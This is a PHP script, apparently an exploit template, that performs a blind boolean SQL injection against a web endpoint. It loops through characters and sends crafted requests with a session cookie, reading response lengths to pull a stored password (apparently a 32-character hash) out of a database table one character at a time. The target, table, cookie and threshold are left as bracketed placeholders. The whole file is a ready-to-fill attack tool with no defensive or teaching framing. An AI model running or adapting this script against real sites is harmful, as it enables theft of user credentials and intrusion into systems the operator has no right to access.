<?php

$keyCharacters = '[KEY_CHARACTERS_PLACEHOLDER]';
$cookiePlaceholder = "[COOKIE_DATA_PLACEHOLDER]";

$lengthCounter = 1;
$charOffset = 0;
$databaseEntry = [DB_ENTRY_OFFSET];

while ($lengthCounter <= 32) 
{		
	$currentChar = $keyCharacters[$charOffset];

	$hexRepresentation = dechex(ord($currentChar));
	$proxyURL = 'http://[TARGET_WEBSITE]/some-endpoint?query=mid%28%28select%20password%20from%20[TABLE_NAME]%20order%20by%20[SORT_CRITERIA]%20desc%20limit%20'.$databaseEntry.',1%29,%20'.$lengthCounter.',%201%20%29=0x' . $hexRepresentation;

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
	curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, "[YOUR_USER_AGENT]");
	curl_setopt($ch, CURLOPT_URL, $proxyURL);
	curl_setopt($ch, CURLOPT_COOKIE, $cookiePlaceholder);

	$response = curl_exec($ch);
	$responseLength = strlen($response);

	if ($responseLength > [THRESHOLD_VALUE]) 
	{
		echo $hexRepresentation;
		$currentHex .= $hexRepresentation;
		$lengthCounter++;
		$charOffset = 0;
	}
	else 
	{
		$charOffset++; 
		
		if ($charOffset > strlen($keyCharacters)) 
		{
			die('Not found');
		}
	}
}

?>
